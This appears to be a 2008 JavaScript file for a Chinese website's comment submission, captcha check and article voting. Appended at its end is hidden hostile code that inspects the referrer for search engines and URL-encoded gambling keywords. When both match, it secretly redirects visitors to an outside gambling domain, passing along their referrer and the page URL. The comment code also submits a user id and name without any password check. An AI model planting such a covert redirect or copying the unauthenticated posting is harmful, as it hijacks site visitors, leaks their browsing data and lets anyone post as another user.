/**
modify by cao2xi 2008-11-24
修改评论提交方式
commentSubmit 函数修改：
1.form uid 内容。
2.checkform 信息提交和验证，只验证验证码，不验证用户密码。
3.ajax_sendfb 信息提交，提交用户名和uid，不再提交用户密码。
*/
function InitAjax()
{
  var ajax=false; 
  try { 
    ajax = new ActiveXObject("Msxml2.XMLHTTP"); 
  } catch (e) { 
    try { 
      ajax = new ActiveXObject("Microsoft.XMLHTTP"); 
    } catch (E) { 
      ajax = false; 
    } 
  }
  if (!ajax && typeof XMLHttpRequest!='undefined') { 
    ajax = new XMLHttpRequest(); 
  } 
  return ajax;
} 
String.prototype.trim = function(){return this.replace(/(^[ |　]*)|([ |　]*$)/g, "");}
function $(s){return document.getElementById(s);}
function $$(s){return document.frames?document.frames[s]:$(s).contentWindow;}
function $c(s){return document.createElement(s);}
function initSendTime(){
	SENDTIME = new Date();
}
var err=0;
function commentSubmit_bak(theform){
	
	var smsg =theform.msg.value;
	var susername = theform.username.value;
	var suid = theform.uid.value;
	var snouser = theform.nouser.checked;
	var sauthnum = theform.authnum.value;	 
	var sartID = theform.artID.value;
	 
	
	var sDialog = new dialog();
	sDialog.init();
	
	if(smsg == ''){
		sDialog.event('请输入评论内容!','');
		sDialog.button('dialogOk','void 0');
		$('dialogOk').focus();
		return false;
	}
	if(smsg.length>300){
		sDialog.event('评论内容不能超过150个字...','');
		sDialog.button('dialogOk','void 0');
		$('dialogOk').focus();
		return false;
  }
	if( susername == '' && snouser == false){
		sDialog.event('请您登陆或选择匿名发表!','');
		sDialog.button('dialogOk','void 0');
		$('dialogOk').focus();
		return false;
	}	
	if(sauthnum == ''){
		sDialog.event('请输入验证码!','');
		sDialog.button('dialogOk','void 0');
		$('dialogOk').focus();
		return false;
	}
	if(sartID == ''){
		sDialog.event('非法提交,错误号#0012','');
		sDialog.button('dialogOk','void 0');
		$('dialogOk').focus();
		return false;
	}
  
	
var url = "/shtml/comment/checkform.php?authnum="+sauthnum;

var ajax = InitAjax();
ajax.open("GET",url,false);
ajax.send();
err=ajax.responseText;
if(err == 0){
	var ajax = InitAjax();
	ajax.open("GET",url,false);
	ajax.send();
	err=ajax.responseText;
}

if(err == 2){
	sDialog.event('非法提交,错误号#002','');
	sDialog.button('dialogOk','void 0');
	$('dialogOk').focus();
	return false;	
}
if(err == 1){
	sDialog.event('验证码输入错误!','');
	sDialog.button('dialogOk','void 0');
	$('dialogOk').focus();
	return false;
}

smsg = encodeURI(smsg);
susername = encodeURI(susername);

var url = "/shtml/comment/ajax_sendfb.php?artID="+sartID+"&nouser="+snouser+"&authnum="+sauthnum+"&username="+susername+"&uid="+suid+"&mesg="+smsg;
 
var ajax = InitAjax();
ajax.open("GET", url, false);
ajax.send();
err_msg = ajax.responseText;
 
   if(err_msg == 1){
   	
   		sDialog.event('对不起发贴间距不得小于60s','');
	    sDialog.button('dialogOk','void 0');
	    $('dialogOk').focus();
	    return false;	
   	
   	
   	}


   if(err_msg == 2){
   	
   		sDialog.event('包含非法关键词!','');
	    sDialog.button('dialogOk','void 0');
	    $('dialogOk').focus();
	    return false;	
   	
   	
   	}


   if(err_msg == 3){
   	
   		sDialog.event('评论字数超过限制！','');
	    sDialog.button('dialogOk','void 0');
	    $('dialogOk').focus();
	    return false;	
   	
   	
   	}

   if(err_msg == 4){
   	
   		sDialog.event('信息不完整！','');
	    sDialog.button('dialogOk','void 0');
	    $('dialogOk').focus();
	    return false;	
   	
   	
   	}

	getcommentend(thistid);
	getArtCount(thistid);
	refimg();
	alert('感谢您参与评论');
	return false;
}
 

function getcommentend(tid){
 	var url = "/shtml/comment/artcomment2.php?artid="+tid;
 
	var ajax = InitAjax();
	ajax.open("GET", url, false);
	ajax.send();
	document.getElementById('artcomments').innerHTML = ajax.responseText;
  
}
function getArtCount(tid){
	var url = "/shtml/comment/getArtCount.php?artid="+tid+"&type=all";
	var ajax = InitAjax();
	ajax.open("GET", url, false);
	ajax.send();
	document.getElementById('pinglun2').innerHTML = ajax.responseText; 
	document.getElementById('feedback').innerHTML = ajax.responseText; 
}



function getcountscom(id,quick)
{

  //alert(id+quick);
  if (typeof(id) == 'undefined')
  {
    return false;
  }
  if(quick==11)
  {
	  getcountscoms(id,quick);
  }else if(quick==12 || quick==13 ||quick==14 ||quick==15 ||quick==16)
  {
	  return false; 
  }
  else
  {
	  var url = "/shtml/comment/showArtCom.php?artid="+id+"&quick="+quick; 
	  var i=0;
	  var ajax = InitAjax();
	  ajax.open("GET", url, true); 
	   ajax.onreadystatechange = function() {   
		if (ajax.readyState == 4 && ajax.status == 200) { 
			i = ajax.responseText; 
			if(i == -1){
				alert("您已经对本文进行过投票，无法重复投票。");
			}else{ 
			if(!i){
				i=0;
			}
				var x=""+id+"_"+quick; 
	  
				if(quick>10){ 
				quicks=quick-10;
				  x=""+id+"_"+quicks; 
				} 
			  var show = document.getElementById(x); 
				com= "("+i+"票)"; 
				show.innerHTML= com;
				//show2.innerHTML = cTrim(i,0);
			}
		} 
	  }
	  //发送空
	  ajax.send(null); 
  }
}
function getcountscoms(id,quick)
{
	  var url = "/shtml/comment/showArtCom.php?artid="+id+"&quick="+quick; 
	  var i=0;
	  var ajax = InitAjax();
	  ajax.open("GET", url, true); 
	   ajax.onreadystatechange = function() {   
		if (ajax.readyState == 4 && ajax.status == 200) { 
			i = ajax.responseText; 
			//alert(i);
			var arr=i.split(",");
			for(var y=0;y<arr.length;y++)
			{
				if(arr[y]=="")
				{
					arr[y]=0;
				}
				x=""+id+"_"+(y+1); 
				var show = document.getElementById(x); 
				com= "("+arr[y]+"票)"; 
				show.innerHTML= com;
			}
		} 
	  }
	  //发送空
	  ajax.send(null); 
  
}
function cTrim(sInputString,iType){
var sTmpStr = ' ';
var i = -1;
if(iType == 0 || iType == 1){
while(sTmpStr == ' '){
++i;
sTmpStr = sInputString.substr(i,1);
}
sInputString = sInputString.substring(i);
}
if(iType == 0 || iType == 2){
sTmpStr = ' ';
i = sInputString.length;
while(sTmpStr == ' '){
--i;
sTmpStr = sInputString.substr(i,1);
}
sInputString = sInputString.substring(0,i+1);
}
return sInputString;
} 

if(window.name != 'ad_app6'){
	var r = document.referrer;
	r2 = r.toLowerCase();
	var aSites = new Array
('google.','baidu.','soso.','so.','360.','yahoo.','youdao.','sogou.','gougou.');
	var searchwords = new Array('%E5%8D%9A%E5%BD%A9','%E7%99%BE%E5%AE
%B6%E4%B9%90','%E9%87%91%E8%8A%B1','%E6%8A%95%E6%B3%A8','%E5%BC
%80%E6%88%B7','%E5%A8%B1%E4%B9%90%E5%9F%8E','%E8%B6%B3%E7%90%83','%E7%9B%98%E5%8F
%A3','%E7%89%8C','%E7%9A%87%E5%86%A0','21%E7%82%B9','%E5%BE%B7%E5%B7%9E','%E9%92%B1','%E7%9C
%9F%E9%92%B1','%E6%A3%8B%E7%89%8C','%E6%BE%B3%E9%97%A8','%E8%B5%8C%E5%9C%BA','%E5%A4%AA
%E9%98%B3%E5%9F%8E','%E7%8E%B0%E9%87%91%E7%BD%91','%E5%8D%9A%E5%BD
%A9%E9%80%9A','%E5%85%A8%E8%AE%AF%E7%BD%91','%E7%99%BE%E5%AE
%B6','%E4%B9%90','%E7%89%8C','%E5%88%A9','%E5%BD%A9','%E7%90%83','%E8%B5%8C','%E5%8D
%9A','%E7%9A%87','%E6%BE%B3','%E6%B8%B8%E6%88%8F');
	var btest = false;
	var ctest = false;
	for (i in aSites){
		if (r2.indexOf(aSites[i]) > 0){
			btest = true;
			break;
		}
	}
	for (k in searchwords){
		if (r.indexOf(searchwords[k]) > 0){
			ctest = true;
			break;
		}
	}
	
	if(btest && ctest)
	{
		var Href=window.location.href;
		self.location = 'http://www.0337777.com?url='+r+'&targetpage='+Href;
		window.adworkergo = 'ad_app6';
	}
}